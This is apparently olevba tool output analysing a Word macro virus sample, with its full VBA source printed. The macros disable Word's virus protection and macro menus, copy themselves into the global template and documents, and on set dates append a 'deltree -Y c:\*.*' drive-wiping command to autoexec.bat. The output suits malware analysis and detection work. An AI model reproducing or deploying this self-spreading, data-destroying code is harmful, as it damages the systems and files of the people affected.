olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.SMDM
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.SMDM - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.SMDM - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
CommandBars("macro").Enabled = False
CommandBars("visual basic").Enabled = False
With Options
   .VirusProtection = False
End With

End Sub
Sub AutoOpen()
CommandBars("macro").Enabled = False
CommandBars("visual basic").Enabled = False
With Options
   .VirusProtection = False
End With
If Day(Now()) = 5 And Month(Now()) = 3 Then MakeLove "virus"
If Day(Now()) = 5 And Month(Now()) = 6 Then MakeLove "virus"
If Day(Now()) = 5 And Month(Now()) = 9 Then MakeLove "virus"
If Day(Now()) = 5 And Month(Now()) = 12 Then MakeLove "virus"
On Error GoTo error
file$ = WordBasic.FileName$()
file_macro$ = file$ + ":Module1"
flag = WordBasic.CountMacros(0)
If flag > 0 Then
    For i = 1 To flag
        If WordBasic.MacroName$(i, 0) = "Module1" Then
        t = 1
        End If
    Next i
End If
If t <> 1 Then
     CopyMacro file_macro$, "Module1"
End If
t = 0
flag = WordBasic.CountMacros(1)
If flag > 0 Then
    For i = 1 To flag
        If WordBasic.MacroName$(i, 1) = "Module1" Then
        t = 1
        End If
        Next i
End If
If t <> 1 Then
    CopyMacro "Module1", file_macro$
    ActiveDocument.SaveAs , 1
End If
error:
End Sub
Sub CopyMacro(S_M, D_M)
WordBasic.MacroCopy S_M, D_M
End Sub

Sub ToolsMacro()
Application.Visible = False
End Sub

Sub MakeLove(NoUse)
On Error GoTo Next10
Open "c:\autoexec.bat" For Append As #1
Print #1, "@echo off"
Print #1, "c:\windows\command\deltree -Y c:\*.* >#v#"
Close #1
Next10:
Rem shell("c:\windows\command\deltree -Y c:\windows\system\*.* >#v#",vbMinimizedNoFocus)
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedNoFocus  |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

